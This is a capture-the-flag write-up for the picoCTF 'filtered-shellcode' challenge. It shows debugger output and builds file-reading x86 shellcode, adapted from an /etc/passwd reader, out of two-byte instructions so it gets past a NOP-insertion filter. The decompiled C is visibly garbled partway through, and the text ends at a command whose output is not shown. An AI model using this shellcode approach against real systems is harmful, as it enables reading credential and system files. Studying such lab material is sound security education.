# filtered-shellcode
Category: Binary Exploitation, 160 points
## Description
> A program that just runs the code you give it? That seems kinda boring...
A binary file was attached.
## Solution
When we run the binary, it asks us for code to run:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ ./fun
Give me code to run:
```
Let's see what it does under the hood:
```c
undefined4 main(undefined param_1)
{
  int iVar1;
  char user_input [1000];
  char local_15;
  uint i;
  undefined1 *local_10;
  local_10 = &param_1;
  setbuf(stdout,(char *)0x0);
  i = 0;
  local_15 = 0;
  puts("Give me code to run:");
  iVar1 = fgetc(stdin);
  local_15 = (char)iVar1;
  while ((local_15 != '\n' && (i > 0x1f) >> 0x1e;
      if ((int)((i + uVar3 & 3) - uVar3)   b *0x080485c9
Breakpoint 1 at 0x80485c9
gef>  r
Starting program: /media/sf_CTFs/pico/filtered-shellcode/fun
Give me code to run:
abcdefgh
Breakpoint 1, 0x080485c9 in execute ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd570  →  0x90906261
$ebx   : 0xffffd590  →  0xf7fb65e0  →  0x00000000
$ecx   : 0xffffd570  →  0x90906261
$edx   : 0xffffd570  →  0x90906261
$esp   : 0xffffd570  →  0x90906261
$ebp   : 0xffffd5b8  →  0xffffd9c8  →  0x00000000
$esi   : 0xf7fb5000  →  0x001e4d6c
$edi   : 0xf7fb5000  →  0x001e4d6c
$eip   : 0x080485c9  →   call eax
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd570│+0x0000: 0x90906261   ← $esp
0xffffd574│+0x0004: 0x90906463
0xffffd578│+0x0008: 0x90906665
0xffffd57c│+0x000c: 0x90906867
0xffffd580│+0x0010: 0xf7fb5dc3  →  0x000000f7
0xffffd584│+0x0014: 0xf7ddac28  →  0x000031ea
0xffffd588│+0x0018: 0x00000014
0xffffd58c│+0x001c: 0x08048502  →   add eax, 0x1afe
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80485c0     mov    eax, DWORD PTR [ebp-0x1c]
    0x80485c3     mov    DWORD PTR [ebp-0x20], eax
    0x80485c6     mov    eax, DWORD PTR [ebp-0x20]
 →  0x80485c9     call   eax
    0x80485cb     mov    esp, ebx
    0x80485cd     nop
    0x80485ce     mov    ebx, DWORD PTR [ebp-0x4]
    0x80485d1     leave
    0x80485d2     ret
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0xffffffffffffd570 (
   [sp + 0x0] = 0x90906261
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fun", stopped 0x80485c9 in execute (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80485c9 → execute()
[#1] 0x80486a8 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef>  hexdump byte $eax
0xffffd570     61 62 90 90 63 64 90 90 65 66 90 90 67 68 90 90    ab..cd..ef..gh..
0xffffd580     c3 5d fb f7 28 ac dd f7 14 00 00 00 02 85 04 08    .]..(...........
0xffffd590     e0 65 fb f7 00 50 fb f7 70 d5 ff ff 70 d5 ff ff    .e...P..p...p...
0xffffd5a0     10 00 00 00 10 00 00 00 08 00 00 00 10 00 00 00    ................
```
We can see that after every two bytes of our input, the program inserted two NOPs (0x90). Going back to the code, this makes sense.
Now, suppose we would enter `"mov eax, 17"` as our shellcode:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn asm -f hex "mov eax, 17"
b811000000
```
This would turn to:
```
b81190900000909000
```
Which would be interpreted as:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn disasm "b81190900000909000"
   0:    b8 11 90 90 00           mov    eax,  0x909011
   5:    00                       .byte 0x0
   6:    90                       nop
   7:    90                       nop
```
Not exactly what we wanted. So, our problem is that we can't just enter any shellcode as input. Our easiest workaround would be to work with assembly instructions of exactly two bytes. If we need an instruction of one byte, we can pad it with a NOP. If we need an instruction of more than two bytes, we'll just have to find a way to refactor it to multiple instructions of two bytes.
We want to read the flag, which is usually saved as `"flag.txt"` in the challenge directory. So, we'll use a shellcode to print the contents of a file. 
[Here's](http://shell-storm.org/shellcode/files/shellcode-842.php) a short shellcode to read the contents of `/etc/passwd`:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn disasm "31C9F7E1B00551687373776468632F7061682F2F657489E3CD809391B00331D266BAFF0F42CD809231C0B004B301CD8093CD80"
   0:    31 c9                    xor    ecx,  ecx
   2:    f7 e1                    mul    ecx
   4:    b0 05                    mov    al,  0x5
   6:    51                       push   ecx
   7:    68 73 73 77 64           push   0x64777373
   c:    68 63 2f 70 61           push   0x61702f63
  11:    68 2f 2f 65 74           push   0x74652f2f
  16:    89 e3                    mov    ebx,  esp
  18:    cd 80                    int    0x80
  1a:    93                       xchg   ebx,  eax
  1b:    91                       xchg   ecx,  eax
  1c:    b0 03                    mov    al,  0x3
  1e:    31 d2                    xor    edx,  edx
  20:    66 ba ff 0f              mov    dx,  0xfff
  24:    42                       inc    edx
  25:    cd 80                    int    0x80
  27:    92                       xchg   edx,  eax
  28:    31 c0                    xor    eax,  eax
  2a:    b0 04                    mov    al,  0x4
  2c:    b3 01                    mov    bl,  0x1
  2e:    cd 80                    int    0x80
  30:    93                       xchg   ebx,  eax
  31:    cd 80                    int    0x80
```
First, we'd like to replace the `/etc/passwd` with `flag.txt`:
```assembly
push   0x64777373 ; "dwss"
push   0x61702f63 ; "ap/c"
push   0x74652f2f ; "te//"
 ; Turn into:
push   0x7478742e ; "txt."
push   0x67616c66 ; "galf"
```
Encoded, we get:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn asm -f hex "push   0x7478742e; push   0x67616c66;" | xxd -p -r | pwn disasm
   0:    68 2e 74 78 74           push   0x7478742e
   5:    68 66 6c 61 67           push   0x67616c66
```
So, each of these `push` instructions are 5 bytes long. How do we get the same result with just 2-byte instructions?
Well, one way to express `0x7478742e` is by factorizing it to prime factors:
```python
>>> hex(2 * 5843 * 167213)
'0x7478742e'
```
So, `push 0x7478742e` could become:
```assembly
mov eax, 167213
mov ebx, 5843
mul ebx
mov ebx, 2
mul ebx
push eax
```
However, this code still requires instructions larger than two bytes. But what if we make sure that none of the constants are larger than 256?
```python
>>> hex(2 * ((2 * 23 * 127)+1) * ((2 * 2 * 17 * ((2 * ((2 * 2 * ((2 * 3 * 3 * 17)+1))+1))+1))+1))
'0x7478742e'
```
Then, we can rewrite this in assembly as follows:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/filtered-shellcode]
└─$ pwn disasm "31C031DBB011B303F7E3F7E3B302F7E3D1EB01D8B302F7E3F7E3D1EB01D8B302F7E3D1EB01D8B311F7E3B302F7E3F7E3D1EB01D8509031C0B07FB317F7E3B302F7E3D1EB01D8B302F7E35B90F7E35090"